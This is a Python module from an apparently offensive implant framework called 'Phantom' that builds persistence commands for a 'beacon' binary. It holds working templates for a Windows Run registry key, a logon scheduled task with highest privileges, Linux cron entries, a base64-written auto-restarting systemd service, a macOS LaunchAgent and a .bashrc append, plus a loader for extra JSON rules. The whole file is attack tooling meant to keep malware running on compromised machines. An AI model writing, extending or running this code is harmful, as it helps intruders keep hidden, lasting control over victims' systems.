"""
persistence.py — Phantom Persistence Module
┌────────────────────────────────────────────
Generates and executes persistence commands for various platforms.
Now supports JSON-based rule configuration for flexible persistence strategies.
"""

import os
import json
import base64
from typing import Dict, Any, List, Optional
from phantom.utils.notifier import notifier


class PersistenceRule:
    """A single persistence technique rule loaded from JSON."""

    def __init__(self, rule_data: Dict[str, Any]):
        self.name = rule_data.get("name", "unnamed")
        self.platforms = rule_data.get("platforms", ["windows", "linux"])
        self.method = rule_data.get("method", "custom")
        self.requires_admin = rule_data.get("requires_admin", False)
        self.command_template = rule_data.get("command_template", "")
        self.description = rule_data.get("description", "")

    def generate(self, binary_path: str, **kwargs) -> Optional[str]:
        """Generate the persistence command from template."""
        if not self.command_template:
            return None
        try:
            return self.command_template.format(binary_path=binary_path, **kwargs)
        except KeyError as e:
            notifier.warn(f"Rule '{self.name}' missing parameter: {e}")
            return None


class PersistenceManager:
    """Persistence manager with JSON rule support and built-in techniques."""

    DEFAULT_RULES_PATH = os.path.join(
        os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(__file__)))),
        "data", "persistence_rules.json"
    )

    BUILTIN_RULES = [
        {
            "name": "windows_runkey",
            "platforms": ["windows"],
            "method": "registry",
            "requires_admin": False,
            "command_template": 'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v {name} /t REG_SZ /d "{binary_path}" /f',
            "description": "Registry Run Key persistence (HKCU)",
        },
        {
            "name": "windows_schtask",
            "platforms": ["windows"],
            "method": "scheduled_task",
            "requires_admin": True,
            "command_template": 'schtasks /create /tn "{name}" /tr "{binary_path}" /sc onlogon /rl highest /f',
            "description": "Windows Scheduled Task (runs on logon, highest privileges)",
        },
        {
            "name": "linux_cron",
            "platforms": ["linux"],
            "method": "cron",
            "requires_admin": False,
            "command_template": '(crontab -l 2>/dev/null; echo "0 * * * * {binary_path}") | crontab -',
            "description": "Linux crontab entries (hourly execution)",
        },
        {
            "name": "linux_systemd",
            "platforms": ["linux"],
            "method": "systemd",
            "requires_admin": True,
            "command_template": 'echo {unit_b64} | base64 -d > /etc/systemd/system/{name}.service && systemctl enable {name} && systemctl start {name}',
            "description": "Systemd service unit (auto-restarting)",
        },
        {
            "name": "macos_launchagent",
            "platforms": ["macos"],
            "method": "launchd",
            "requires_admin": False,
            "command_template": 'mkdir -p "$HOME/Library/LaunchAgents" && cat > "$HOME/Library/LaunchAgents/{name}.plist" << PLIST\n<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">\n<plist version="1.0">\n<dict>\n  <key>Label</key>\n  <string>{name}</string>\n  <key>ProgramArguments</key>\n  <array>\n    <string>{binary_path}</string>\n  </array>\n  <key>RunAtLoad</key>\n  <true/>\n</dict>\n</plist>\nPLIST\nlaunchctl load "$HOME/Library/LaunchAgents/{name}.plist"',
            "description": "macOS LaunchAgent (user-level persistence)",
        },
    ]

    def __init__(self):
        self.rules: List[PersistenceRule] = []
        self._load_builtin_rules()
        self._load_custom_rules()

    def _load_builtin_rules(self) -> None:
        """Load built-in persistence rules."""
        self.rules = [PersistenceRule(r) for r in self.BUILTIN_RULES]

    def _load_custom_rules(self) -> None:
        """Load custom rules from JSON file if it exists.

        A custom rule whose name matches a built-in rule overrides it
        (the built-in is replaced in place), so users can tune defaults.
        """
        if not os.path.isfile(self.DEFAULT_RULES_PATH):
            return
        try:
            with open(self.DEFAULT_RULES_PATH, "r") as f:
                data = json.load(f)
            loaded = 0
            for rule_data in data.get("rules", []):
                name = rule_data.get("name")
                if not name:
                    continue
                for i, existing in enumerate(self.rules):
                    if existing.name == name:
                        self.rules[i] = PersistenceRule(rule_data)
                        loaded += 1
                        break
                else:
                    self.rules.append(PersistenceRule(rule_data))
                    loaded += 1
            notifier.info(f"Loaded {loaded} custom persistence rules")
        except Exception as e:
            notifier.warn(f"Failed to load persistence rules: {e}")

    def _get_platform(self, os_name: str) -> str:
        """Map OS name string to platform identifier."""
        os_lower = os_name.lower()
        if "windows" in os_lower or os_lower.startswith("win"):
            return "windows"
        elif "darwin" in os_lower or "macos" in os_lower or "mac os" in os_lower:
            return "macos"
        elif "android" in os_lower:
            return "android"
        elif "linux" in os_lower or "ubuntu" in os_lower or "debian" in os_lower or "centos" in os_lower:
            return "linux"
        return "linux"

    def get_windows_runkey(self, binary_path: str, name: str = "PhantomBeacon") -> str:
        """Generate a Windows Registry Run Key command (built-in)."""
        return self._execute_rule("windows_runkey", binary_path, name=name)

    def get_windows_schtask(self, binary_path: str, name: str = "PhantomUpdate") -> str:
        """Generate a Windows Scheduled Task command (built-in)."""
        return self._execute_rule("windows_schtask", binary_path, name=name)

    def get_linux_cron(self, binary_path: str) -> str:
        """Generate a Linux Crontab entry (built-in)."""
        return self._execute_rule("linux_cron", binary_path)

    def get_linux_systemd(self, binary_path: str, name: str = "phantom") -> str:
        """Generate a Linux Systemd service unit (built-in)."""
        # Generate systemd unit content
        unit = f"""[Unit]
Description=Phantom Beacon
After=network.target

[Service]
ExecStart={binary_path}
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
"""
        unit_b64 = base64.b64encode(unit.encode()).decode()
        return self._execute_rule("linux_systemd", binary_path, name=name, unit_b64=unit_b64)

    def _execute_rule(self, rule_name: str, binary_path: str, **kwargs) -> str:
        """Execute a persistence rule by name."""
        for rule in self.rules:
            if rule.name == rule_name:
                result = rule.generate(binary_path, **kwargs)
                if result:
                    return result
                return f"Error: Rule '{rule_name}' failed to generate command"
        return f"Error: Rule '{rule_name}' not found"

    def list_rules(self, platform: str = "") -> List[Dict[str, Any]]:
        """List all rules, optionally filtered by platform."""
        result = []
        for rule in self.rules:
            if platform and platform not in rule.platforms:
                continue
            result.append({
                "name": rule.name,
                "platforms": rule.platforms,
                "method": rule.method,
                "requires_admin": rule.requires_admin,
                "description": rule.description,
            })
        return result

    def get_rules_for_platform(self, os_name: str) -> List[PersistenceRule]:
        """Get all applicable rules for a given OS."""
        platform = self._get_platform(os_name)
        return [r for r in self.rules if platform in r.platforms]

    def apply_rule(self, rule_name: str, binary_path: str, **kwargs) -> Optional[str]:
        """Apply a specific rule by name, returning the command."""
        for rule in self.rules:
            if rule.name == rule_name:
                return rule.generate(binary_path, **kwargs)
        return None


# Default rules JSON template
DEFAULT_RULES_JSON = r"""{
  "rules": [
    {
      "name": "custom_bash_rc",
      "platforms": ["linux", "macos"],
      "method": "shell_profile",
      "requires_admin": false,
      "command_template": "echo '{binary_path}' >> ~/.bashrc",
      "description": "Add to .bashrc for shell persistence"
    },
    {
      "name": "custom_crontab",
      "platforms": ["linux", "macos"],
      "method": "cron",
      "requires_admin": false,
      "command_template": "(crontab -l 2>/dev/null; echo '* * * * * {binary_path}') | crontab -",
      "description": "Crontab entry with custom interval"
    }
  ]
}"""


def create_default_rules_file(path: str = PersistenceManager.DEFAULT_RULES_PATH) -> None:
    """Create the default rules JSON file if it doesn't exist."""
    os.makedirs(os.path.dirname(path), exist_ok=True)
    if not os.path.exists(path):
        with open(path, "w") as f:
            f.write(DEFAULT_RULES_JSON)


persistence_manager = PersistenceManager()
